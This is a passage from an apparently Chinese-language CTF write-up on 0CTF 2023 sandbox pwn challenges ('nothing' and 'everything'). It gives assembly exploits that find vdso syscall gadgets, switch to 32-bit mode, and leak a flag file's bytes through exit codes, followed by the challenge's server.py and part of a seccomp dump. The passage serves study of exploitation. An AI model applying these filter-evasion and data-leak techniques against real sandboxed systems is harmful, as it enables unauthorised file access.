+<ul>
+<li><p>_start</p>
+<p>在envp中找正在执行的elf的路径（r13），在vdso中找syscall（r14）</p>
+</li>
+<li><p>open_flag</p>
+<ul>
+<li><p>由于open需要filename地址为0x31337，所以调用strcpy将flag字符串复制到0x31337</p>
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/strcpy.png" srcset="/img/loading.gif" lazyload class title="strcpy">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">strcpy:<br>    cld			; 将方向标志位（DF）清零，字符串处理指令递增地址<br>cpy1:<br>    lodsb		; 加载字节，将字节从源地址加载到累加器 AL 中<br>    stosb		; 存储字节，将累加器 AL 中的字节存储到目的地址<br>    test al,al	; 遇到空字节结束<br>    jne cpy1<br>    ret<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>打开flag</p>
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/open1.png" srcset="/img/loading.gif" lazyload class title="open1} * open_elf * 将elf路径复制到0x31337，打开elf文件 {% asset_img openelf.png openelf">
+</li>
+<li><p>切换至32位，编译时预留好了rw权限的栈，切换完成后执行start_32</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">    mov     edx, r15d ; clear high 32 bit vdso addr<br>    mov     rsp, stack<br>    mov     rdi, start_32<br>    <br>    ……<br>    <br>retf_to_32:<br>; switch to 32 bit<br>    push    0x23            ; cs<br>    push    rdi             ; ip<br>    retfq                   ; jump to rdi<br></code></pre></td></tr></table></figure>
+
+<p>这时vdso的低32位地址已经被保存到了edx中</p>
+</li>
+</ul>
+</li>
+<li><p>start_32</p>
+<ul>
+<li><p>利用sysenter将当前elf文件mmap到vdso低32位地址处，因为sysenter返回后会回到vdso return address的低32位地址（6个参数栈传参）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs assembly">_sysenter:<br>    push    ecx             ; push   ecx<br>    push    edx             ; push   edx<br>    push    ebp             ; push   ebp<br>    mov     ebp, esp<br>    sysenter<br><br>start_32:<br>mmap_elf_to_vdso:<br>    push    0x1000          ; off: 0x1000 : .text start<br>    push    4               ; fd: 4, elf file<br>    push    0x11            ; flags: MAP_FIXED | MAP_SHARED<br>    push    5               ; prot: RX<br>    push    0x4000          ; length: elf size<br>    push    edx             ; addr: vdso return addr &amp;&amp; elf base<br>    mov     ebx, esp<br>    mov     eax, 0x5a       ; mmap<br>    call    _sysenter<br></code></pre></td></tr></table></figure>
+
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/sysentermmap.png" srcset="/img/loading.gif" lazyload class title="sysentermmap">
+
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/vmmap.png" srcset="/img/loading.gif" lazyload class title="vmmap">
+
+<p>跑飞哩~</p>
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/fly.png" srcset="/img/loading.gif" lazyload class title="fly">
+
+<p>着陆！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">vdso_landing:<br>    times 4096 db 0x90      ; nop padding<br>    pop     ebp<br>    pop     edx<br>    pop     ecx<br>    ret<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>然后就是rw然后退出</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>再重新看一下linker.ld</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">SECTIONS<br><br>&#123;<br><br>. = <span class="hljs-number">0x2f000</span>;<br><br>.text : &#123; *(.text) &#125;<br><br>. = <span class="hljs-number">0x31000</span>;<br><br>.data : &#123; *(.data) &#125;<br><br>.bss : &#123; *(.bss) &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>需要</p>
+<ul>
+<li>open时&amp;filename &#x3D;&#x3D; 0x31337，所以需要调整加载基地址达到这个要求</li>
+<li>之后要把elf映射到vdso低地址处，所以代码段在较低的位置</li>
+</ul>
+<h3 id="侧信道"><a href="#侧信道" class="headerlink" title="侧信道"></a>侧信道</h3><p>server.py会输出程序返回值，所以打开flag后mmap到内存里，exit flag的每个字节</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">SECTIONS<br><br>&#123;<br><br>. = <span class="hljs-number">0x2f000</span>;<br><br>.text : &#123; *(.text) &#125;<br><br>. = <span class="hljs-number">0x31000</span>;<br><br>.bss : &#123; *(.bss) &#125;<br><br>.data : &#123; *(.data) &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs assembly">[BITS 64]<br>; compile with: nasm -f elf64 exp.s -o exp.o &amp;&amp; ld exp.o -e _start -o exp -T linker.ld<br>global _start<br>section		.text exec<br>_start:<br> 	 ; try to find vdso<br> 	 ; mov rcx, 0<br>		mov rbx, rsp<br>	get_vdso_base:<br>		add rbx, 8<br>		mov r15, [rbx]<br>		cmp r15, 0x21<br>		jne get_vdso_base<br>		mov rbx, [rbx+8]<br><br>	get_syscall:<br>		add rbx, 1<br>		mov r15, [rbx]<br>		and r15, 0xffffff<br>		cmp r15, 0xc3050e<br>		jl get_syscall<br>		cmp r15, 0xc30510<br>		jg get_syscall<br>		 ; save syscall<br>		mov r15, rbx<br>		 ; open<br>		mov rax, 2<br>		mov rdi, 0x31337<br>		mov rsi, 0<br>		mov rdx, 0<br>		call r15<br>		 ; mmap<br>		mov r8, rax<br>		mov r9, 0<br>		mov r10, 2<br>		mov rax, 9<br>		mov rdi, 0xdead000<br>		mov rsi, 0x1000<br>		mov rdx, 2<br>		call r15<br>		mov rdi, [0xdead000] ; 0xdead0001!!3<br>		 ; mov rdi, 137<br>		mov rax, 0x3c<br>		call r15<br><br>section   	.bss noexec<br>pad:        resb        0x337<br><br>section		.data noexec<br>flag:     	db      	&quot;flag&quot;, 0<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>找vdso</p>
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/findvdso.png" srcset="/img/loading.gif" lazyload class title="findvdso">
+</li>
+<li><p>找syscall</p>
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/findsyscall.png" srcset="/img/loading.gif" lazyload class title="findsyscall">
+</li>
+<li><p>open，mmap，然后exit flag每个字节</p>
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/open111.png" srcset="/img/loading.gif" lazyload class title="open111">
+
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/mmapppp.png" srcset="/img/loading.gif" lazyload class title="mmapppp">
+
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/vmmap1.png" srcset="/img/loading.gif" lazyload class title="vmmap1">
+
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/exit.png" srcset="/img/loading.gif" lazyload class title="exit"></li>
+</ul>
+<h1 id="2023-0CTF-everything"><a href="#2023-0CTF-everything" class="headerlink" title="2023 0CTF everything"></a>2023 0CTF everything</h1><h2 id="server-py-2"><a href="#server-py-2" class="headerlink" title="server.py"></a>server.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3 -u</span><br><br><span class="hljs-keyword">import</span> os, sys, random, subprocess, gmpy2<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha3_256<br><span class="hljs-keyword">from</span> elftools.elf.elffile <span class="hljs-keyword">import</span> ELFFile<br><span class="hljs-keyword">from</span> elftools.elf.constants <span class="hljs-keyword">import</span> P_FLAGS<br><br>os.chdir(os.path.dirname(__file__))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">proof_of_work</span>(<span class="hljs-params">sec = <span class="hljs-number">10</span></span>):<br>    <span class="hljs-comment"># From 0CTF/TCTF 2021 &quot;checkin&quot;</span><br>    p = gmpy2.next_prime(random.getrandbits(<span class="hljs-number">512</span>))<br>    q = gmpy2.next_prime(random.getrandbits(<span class="hljs-number">512</span>))<br>    n = p*q<br>    c = <span class="hljs-number">2900000</span><br>    t = c*sec + random.randint(<span class="hljs-number">0</span>,c)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Show me your computation:&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;2^(2^<span class="hljs-subst">&#123;t&#125;</span>) mod <span class="hljs-subst">&#123;n&#125;</span> = ?&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your answer: &#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        sol = <span class="hljs-built_in">int</span>(sys.stdin.readline())<br>        phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>        u = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, t, phi)<br>        w = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, u, n)<br>        <span class="hljs-keyword">if</span> w == sol:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Correct!&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Wrong Answer!&#x27;</span>)<br>            exit()<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid Input!&#x27;</span>)<br>        exit()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_bytes</span>(<span class="hljs-params">data, b</span>):<br>    p = -<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p = data.find(b, p+<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> p == -<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">elif</span> p &amp; <span class="hljs-number">0xfff</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> p &amp; <span class="hljs-number">0xfff</span> == <span class="hljs-number">0xfff</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_segments</span>(<span class="hljs-params">elf</span>):<br>    <span class="hljs-keyword">for</span> seg <span class="hljs-keyword">in</span> elf.iter_segments():<br>        <span class="hljs-keyword">if</span> seg.header.p_filesz &gt; <span class="hljs-number">0x10000</span> <span class="hljs-keyword">or</span> seg.header.p_memsz &gt; <span class="hljs-number">0x10000</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Segment too large&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_INTERP&#x27;</span> <span class="hljs-keyword">or</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_DYNAMIC&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;No dynamic link&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_LOAD&#x27;</span> <span class="hljs-keyword">and</span> seg.header.p_flags &amp; P_FLAGS.PF_W <span class="hljs-keyword">and</span> seg.header.p_flags &amp; P_FLAGS.PF_X:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;W^X&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_GNU_STACK&#x27;</span> <span class="hljs-keyword">and</span> seg.header.p_flags &amp; P_FLAGS.PF_X:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;No executable stack&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_elf</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) &lt; <span class="hljs-number">0x34</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Incomplete ELF Header&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data.startswith(<span class="hljs-string">b&#x27;\x7fELF\x01\x01\x01&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">9</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid ELF Magic&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\xcd\x80&#x27;</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;\x0f\x05&#x27;</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad Instruction&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\xcd&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\x80&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\x0f&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\x05&#x27;</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad Instruction&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    elf = ELFFile(BytesIO(data))<br>    <span class="hljs-keyword">if</span> ((elf.header.e_type != <span class="hljs-string">&#x27;ET_EXEC&#x27;</span> <span class="hljs-keyword">and</span> elf.header.e_type != <span class="hljs-string">&#x27;ET_DYN&#x27;</span>)<br>        <span class="hljs-keyword">or</span> elf.header.e_version != <span class="hljs-string">&#x27;EV_CURRENT&#x27;</span><br>        <span class="hljs-keyword">or</span> elf.header.e_ehsize != <span class="hljs-number">0x34</span><br>        <span class="hljs-keyword">or</span> elf.header.e_phoff != <span class="hljs-number">0x34</span><br>        <span class="hljs-keyword">or</span> elf.header.e_phnum &lt;= <span class="hljs-number">0</span><br>        <span class="hljs-keyword">or</span> elf.header.e_phnum &gt;= <span class="hljs-number">100</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad ELF Header&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> check_segments(elf)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">try</span>:<br>        size = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Size of your ELF: &#x27;</span>))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid size!&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> size &lt;= <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> size &gt; <span class="hljs-number">0x10000</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad size!&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ELF File:&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        data = sys.stdin.buffer.read(size)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid file data&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) != size:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Incomplete file data&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Received: %d bytes&#x27;</span> % <span class="hljs-built_in">len</span>(data))<br>    <span class="hljs-keyword">if</span> check_elf(data):<br>        filename = sha3_256(data).hexdigest()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;File Hash: <span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span>)<br>        path = <span class="hljs-string">f&#x27;./data/<span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span><br>        <span class="hljs-keyword">if</span> os.path.exists(path):<br>            os.unlink(path)<br>        <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;wb&#x27;</span>).write(data)<br>        os.chmod(path, <span class="hljs-number">0o555</span>)<br>        <span class="hljs-keyword">try</span>:<br>            p = subprocess.Popen([<span class="hljs-string">&#x27;docker&#x27;</span>, <span class="hljs-string">&#x27;run&#x27;</span>, <span class="hljs-string">&#x27;-i&#x27;</span>, <span class="hljs-string">&#x27;--rm&#x27;</span>, <span class="hljs-string">&#x27;-v&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;path&#125;</span>:/chroot/<span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span>, <span class="hljs-string">&#x27;tctf/launcher32:2023&#x27;</span>, filename], stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)<br>            p.wait()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Return status: %d&#x27;</span> % p.returncode)<br>            <span class="hljs-keyword">if</span> p.returncode == <span class="hljs-number">137</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Output:&#x27;</span>)<br>                sys.stdout.buffer.write(p.stdout.read())<br>                <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Something went wrong!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> proof_of_work():<br>        main()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bye!&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>比nothing多了一个通过e_ident要求32位的判断</p>
+<h2 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x1b</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-keyword">if</span> (A != ARCH_X86_64) <span class="hljs-keyword">goto</span> <span class="hljs-number">0029</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x35</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x40000000</span>  <span class="hljs-keyword">if</span> (A &lt; <span class="hljs-number">0x40000000</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0005</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x22</span> <span class="hljs-number">0xffffffff</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0xffffffff</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == close) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x1f</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000000b</span>  <span class="hljs-keyword">if</span> (A == munmap) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x1e</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000000c</span>  <span class="hljs-keyword">if</span> (A == brk) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x1d</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000003c</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-built_in">exit</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x1c</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000e7</span>  <span class="hljs-keyword">if</span> (A == exit_group) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0010</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00000009</span>  <span class="hljs-keyword">if</span> (A != mmap) <span class="hljs-keyword">goto</span> <span class="hljs-number">0015</span><br> <span 